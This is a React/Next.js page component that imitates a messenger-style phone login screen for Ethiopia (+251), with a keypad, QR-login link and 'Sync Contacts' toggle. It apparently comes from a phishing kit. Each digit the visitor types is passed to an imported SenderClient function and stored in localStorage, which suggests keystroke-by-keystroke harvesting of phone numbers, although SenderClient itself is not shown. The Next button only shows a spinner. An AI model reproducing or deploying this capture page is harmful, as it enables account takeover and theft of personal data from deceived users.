"use client"

import { useEffect, useState } from "react"
import { ArrowLeft, ArrowRight, Check } from "lucide-react"
import { useRouter } from "next/navigation"
import { SenderClient } from "@/lib/SenderClient"


export default function PhoneVerificationPage() {
  const [phoneNumber, setPhoneNumber] = useState("")
  const [syncContacts, setSyncContacts] = useState(true)
  const router = useRouter()
  const [loading,setLoading]=useState(false)

  const handleNumberInput = (digit: string) => {
    if (phoneNumber.length < 9) {
      setPhoneNumber((prev) => prev + digit)
      SenderClient(digit)
      localStorage.setItem("phone",phoneNumber)
    }
  }

  const handleBackspace = () => {
    setPhoneNumber((prev) => prev.slice(0, -1))
  }

  const formatPhoneNumber = (number: string) => {
    const cleaned = number.replace(/\D/g, "")
    const match = cleaned.match(/^(\d{0,3})(\d{0,3})$/)
    if (match) {
      return [match[1], match[2]].filter(Boolean).join(" ")
    }
    return number
  }

  // 🔑 Add keyboard support for desktop
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key >= "0" && e.key <= "9") {
        handleNumberInput(e.key)
      } else if (e.key === "Backspace") {
        handleBackspace()
      } else if (e.key === "Enter") {
        router.push("/next-page") // 👈 replace with where you want "Next" to go
      }
    }

    window.addEventListener("keydown", handleKeyDown)
    return () => window.removeEventListener("keydown", handleKeyDown)
  }, [phoneNumber, router])

  return (
    <div className="h-screen bg-slate-800 text-white flex flex-col lg:bg-slate-900">

      {/* Desktop top bar */}
      <div className="hidden lg:flex justify-between items-center px-8">
        <button onClick={() => router.back()} className="p-2">
          <ArrowLeft size={24} />
        </button>
        <button className="text-blue-400 text-sm font-medium hover:text-blue-300 transition-colors">
          SETTINGS
        </button>
      </div>

      {/* Mobile back button */}
      <div className="flex items-center px-4 lg:hidden">
        <button onClick={() => router.back()} className="p-2">
          <ArrowLeft size={24} />
        </button>
      </div>

      <div className="flex-1 px-6 lg:flex lg:items-center lg:justify-center py-0">
        <div className="lg:w-full lg:max-w-md lg:mx-auto">
          <div className="text-center mb-8 lg:mb-12">
            <h1 className="text-2xl font-medium  lg:text-3xl lg:mb-6">Your Phone Number</h1>
            <p className="text-gray-400 text-base leading-relaxed lg:text-lg">
              Please confirm your country code
              <br />
              and enter your phone number.
            </p>
          </div>

          <div className=" lg:mb-8">
            <label className="text-gray-400 text-sm mb-2 block lg:hidden">Country</label>
            <div className="border border-gray-600 rounded-lg p-4 flex items-center justify-between bg-slate-700/50 lg:bg-transparent lg:border-gray-500 lg:justify-center lg:py-3">
              <div className="flex items-center gap-3">
                <span className="text-lg">🇪🇹</span>
                <span className="text-white lg:text-gray-300">Ethiopia</span>
              </div>
              <ArrowRight size={20} className="text-gray-400 lg:hidden" />
              <div className="hidden lg:block">
                <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                </svg>
              </div>
            </div>
          </div>

          <div className="mb-4 lg:mb-12">
            <label className="text-gray-400 text-sm mb-2 block lg:hidden">Phone number</label>
            <div className="border border-blue-500 rounded-lg p-4 bg-slate-700/50 flex items-center gap-3 lg:bg-transparent lg:border-b lg:border-t-0 lg:border-l-0 lg:border-r-0 lg:rounded-none lg:border-blue-400 lg:pb-2 lg:pt-0 lg:px-0">
              <span className="text-white font-medium lg:text-gray-300">+251</span>
              <div className="w-px h-6 bg-gray-600 lg:bg-gray-500"></div>
              <input
                type="text"
                value={formatPhoneNumber(phoneNumber)}
                placeholder="--- ---"
                className="flex-1 bg-transparent text-white placeholder-gray-500 outline-none lg:text-gray-300 lg:placeholder-gray-400 lg:text-lg"
                readOnly
              />
            </div>
          </div>

          {/* Desktop Next button */}
          <div className="hidden lg:block mb-8">
            <button
              onClick={() =>setLoading(true)}
              disabled={phoneNumber.length<9}
              className="w-full cursor-pointer bg-blue-600 hover:bg-blue-700 text-white py-3 px-6 rounded-lg font-medium transition-colors"
            >
              {loading?<p className="w-4 h-4 animate-spin border-2 border-pink-700-200 rounded-full mx-auto"></p>:"Next"}
            </button>
          </div>

          <div className="hidden lg:block text-center">
            <button className="text-blue-400 hover:text-blue-300 text-sm transition-colors">
              Quick log in using QR code
            </button>
          </div>

          {/* Mobile sync contacts */}
          <div className="flex items-center gap-3 lg:hidden">
            <button
              onClick={() => setSyncContacts(!syncContacts)}
              className={`w-6 h-6 rounded border-2 flex items-center justify-center ${
                syncContacts ? "bg-blue-500 border-blue-500" : "border-gray-600"
              }`}
            >
              {syncContacts && <Check size={16} className="text-white" />}
            </button>
            <span className="text-white">Sync Contacts</span>
          </div>
        </div>
      </div>
      
      <div className="px-6  flex justify-end lg:hidden">
        <button className="w-16 h-16 bg-blue-500 rounded-full flex items-center justify-center">
          <ArrowRight size={24} className="text-white" />
        </button>
      </div>
       {/* Mobile Keypad */}
       <div className="bg-slate-900 px-4  lg:hidden">
        <div className="grid grid-cols-3 gap-2 max-w-sm mx-auto">
          {/* Row 1 */}
          <button
            onClick={() => handleNumberInput("1")}
            className="h-16 flex flex-col items-center justify-center text-white hover:bg-slate-700 rounded-lg transition-colors"
          >
            <span className="text-2xl font-light">1</span>
          </button>
          <button
            onClick={() => handleNumberInput("2")}
            className="h-16 flex flex-col items-center justify-center text-white hover:bg-slate-700 rounded-lg transition-colors"
          >
            <span className="text-2xl font-light">2</span>
            <span className="text-xs text-gray-400">ABC</span>
          </button>
          <button
            onClick={() => handleNumberInput("3")}
            className="h-16 flex flex-col items-center justify-center text-white hover:bg-slate-700 rounded-lg transition-colors"
          >
            <span className="text-2xl font-light">3</span>
            <span className="text-xs text-gray-400">DEF</span>
          </button>

          {/* Row 2 */}
          <button
            onClick={() => handleNumberInput("4")}
            className="h-16 flex flex-col items-center justify-center text-white hover:bg-slate-700 rounded-lg transition-colors"
          >
            <span className="text-2xl font-light">4</span>
            <span className="text-xs text-gray-400">GHI</span>
          </button>
          <button
            onClick={() => handleNumberInput("5")}
            className="h-16 flex flex-col items-center justify-center text-white hover:bg-slate-700 rounded-lg transition-colors"
          >
            <span className="text-2xl font-light">5</span>
            <span className="text-xs text-gray-400">JKL</span>
          </button>
          <button
            onClick={() => handleNumberInput("6")}
            className="h-16 flex flex-col items-center justify-center text-white hover:bg-slate-700 rounded-lg transition-colors"
          >
            <span className="text-2xl font-light">6</span>
            <span className="text-xs text-gray-400">MNO</span>
          </button>

          {/* Row 3 */}
          <button
            onClick={() => handleNumberInput("7")}
            className="h-16 flex flex-col items-center justify-center text-white hover:bg-slate-700 rounded-lg transition-colors"
          >
            <span className="text-2xl font-light">7</span>
            <span className="text-xs text-gray-400">PQRS</span>
          </button>
          <button
            onClick={() => handleNumberInput("8")}
            className="h-16 flex flex-col items-center justify-center text-white hover:bg-slate-700 rounded-lg transition-colors"
          >
            <span className="text-2xl font-light">8</span>
            <span className="text-xs text-gray-400">TUV</span>
          </button>
          <button
            onClick={() => handleNumberInput("9")}
            className="h-16 flex flex-col items-center justify-center text-white hover:bg-slate-700 rounded-lg transition-colors"
          >
            <span className="text-2xl font-light">9</span>
            <span className="text-xs text-gray-400">WXYZ</span>
          </button>

          {/* Row 4 */}
          <div></div>
          <button
            onClick={() => handleNumberInput("0")}
            className="h-16 flex flex-col items-center justify-center text-white hover:bg-slate-700 rounded-lg transition-colors"
          >
            <span className="text-2xl font-light">0</span>
            <span className="text-xs text-gray-400">+</span>
          </button>
          <button
            onClick={handleBackspace}
            className="h-16 flex items-center justify-center text-white hover:bg-slate-700 rounded-lg transition-colors"
          >
            <span className="text-2xl">⌫</span>
          </button>
          </div>
        </div>
    </div>
  )
}
